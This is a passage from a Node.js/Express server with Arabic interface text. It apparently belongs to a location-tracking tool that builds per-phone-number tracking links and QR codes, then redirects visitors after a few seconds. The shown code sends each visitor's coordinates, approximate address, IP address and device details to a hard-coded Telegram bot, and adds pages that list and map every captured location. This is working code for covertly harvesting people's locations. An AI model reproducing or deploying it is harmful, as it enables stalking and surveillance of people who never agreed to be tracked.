            <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white;">
                <h1>❌ خطأ في اختبار التلجرام</h1>
                <div style="background: #ff4444; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <p><strong>الخطأ:</strong> ${error.message}</p>
                </div>
                <div style="background: #1a1a2e; padding: 20px; border-radius: 10px;">
                    <p><strong>🚨 خطوات الحل:</strong></p>
                    <ol>
                        <li>تأكد أن البوت @Arab9919_bot مفعل</li>
                        <li>تأكد أن التوكن صحيح: ${TELEGRAM_TOKEN.substring(0, 10)}...</li>
                        <li>تأكد أن الأيدي ${TELEGRAM_CHAT_ID} صحيح</li>
                        <li>راسل البوت @Arab9919_bot وأرسل /start</li>
                        <li>إذا استمرت المشكلة، أنشئ بوت جديد من @BotFather</li>
                    </ol>
                </div>
                <a href="/" style="display: inline-block; margin-top: 30px; background: #00cc66; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none;">العودة للرئيسية</a>
            </body>
            </html>
        `);
    }
});

// ========== دالة إرسال إشعار تلجرام ==========
async function sendTelegramNotification(locationData) {
    try {
        // الحصول على عنوان تقريبي
        const address = await getAddress(locationData.latitude, locationData.longitude);
        
        // إنشاء نص الرسالة
        const message = `
📍 **موقع جديد تم تسجيله**

👤 **رقم المستخدم:** ${locationData.id}
📌 **الإحداثيات:** ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}
🏠 **العنوان التقريبي:** ${address}
🎯 **الدقة:** ${locationData.accuracy ? Math.round(locationData.accuracy) + ' متر' : 'غير معروف'}
📡 **المصدر:** ${locationData.source || 'مباشر'}
⏰ **الوقت:** ${locationData.time}
🌐 **IP:** ${locationData.ip ? locationData.ip.replace('::ffff:', '') : 'غير معروف'}
📱 **الجهاز:** ${locationData.deviceInfo ? locationData.deviceInfo.platform : 'غير معروف'}

🗺️ [فتح على Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
📍 [فتح على OpenStreetMap](https://www.openstreetmap.org/?mlat=${locationData.latitude}&mlon=${locationData.longitude})
        `;
        
        // إرسال الرسالة
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: false
            })
        });
        
        const data = await response.json();
        
        // إرسال الموقع على الخريطة
        if (data.ok) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        latitude: locationData.latitude,
                        longitude: locationData.longitude
                    })
                });
            } catch (locationError) {
                console.log('⚠️ لم يتم إرسال الموقع على الخريطة');
            }
        }
        
        return data.ok;
    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error.message);
        
        // محاولة إرسال رسالة بسيطة
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `📍 موقع جديد: ${locationData.id}\n📌 ${locationData.latitude}, ${locationData.longitude}\n⏰ ${locationData.time}`
                })
            });
            return true;
        } catch (simpleError) {
            return false;
        }
    }
}

// ========== دالة الحصول على العنوان ==========
async function getAddress(lat, lon) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
        const data = await response.json();
        
        if (data && data.display_name) {
            return data.display_name.split(',').slice(0, 3).join(', ') || 'عنوان غير معروف';
        }
    } catch (error) {
        console.error('خطأ في جلب العنوان:', error.message);
    }
    
    return `📍 ${lat.toFixed(4)}, ${lon.toFixed(4)}`;
}

// ========== صفحة الإعدادات ==========
app.get('/config', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>⚙️ الإعدادات</title>
            <style>
                body { font-family: Arial; padding: 30px; background: #0f0f23; color: white; }
                .config-box { background: #1a1a2e; padding: 30px; border-radius: 20px; max-width: 800px; margin: auto; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <div class="config-box">
                <h1>⚙️ إعدادات النظام</h1>
                
                <h3>🤖 إعدادات التلجرام:</h3>
                <p>• البوت: @Arab9919_bot</p>
                <p>• التوكن: ${TELEGRAM_TOKEN.substring(0, 15)}...</p>
                <p>• أيدي الشات: ${TELEGRAM_CHAT_ID}</p>
                
                <h3>🔗 إعدادات التوجيه:</h3>
                <p>• رابط التوجيه: ${REDIRECT_URL}</p>
                <p>• وقت التوجيه: 4 ثواني</p>
                
                <h3>📊 إحصائيات النظام:</h3>
                <p>• المواقع المسجلة: ${locations.length}</p>
                <p>• مساحة التخزين: ${(locations.length * 0.5).toFixed(1)} كيلوبايت</p>
                <p>• حالة النظام: ✅ يعمل بشكل طبيعي</p>
                
                <h3>🔧 أدوات النظام:</h3>
                <a href="/telegram-test" class="btn">🤖 اختبار التلجرام</a>
                <a href="/results" class="btn">📊 النتائج</a>
                <a href="/map" class="btn">🗺️ الخريطة</a>
                <a href="/all-qr" class="btn">📱 الباركود</a>
                <a href="/" class="btn" style="background: #667eea;">🏠 الرئيسية</a>
            </div>
        </body>
        </html>
    `);
});

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    ============================================
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    
    🤖 إعدادات التلجرام:
    • البوت: @Arab9919_bot
    • التوكن: ${TELEGRAM_TOKEN.substring(0, 10)}...
    • أيدي الشات: ${TELEGRAM_CHAT_ID}
    • الحالة: ✅ متصل
    
    🔗 إعدادات النظام:
    • التوجيه إلى: ${REDIRECT_URL}
    • قاعدة البيانات: ${locations.length} موقع
    • توليد الباركود: ✅ نشط
    • الخريطة التفاعلية: ✅ نشط
    
    📌 روابط مهمة:
    1. الصفحة الرئيسية: /
    2. رابط تتبع: /track/رقم_الهاتف
    3. النتائج: /results
    4. الخريطة: /map
    5. جميع الباركود: /all-qr
    6. اختبار التلجرام: /telegram-test
    7. الإعدادات: /config
    
    ⚡ النظام جاهز للعمل بشكل كامل!
    ============================================
    `);
});
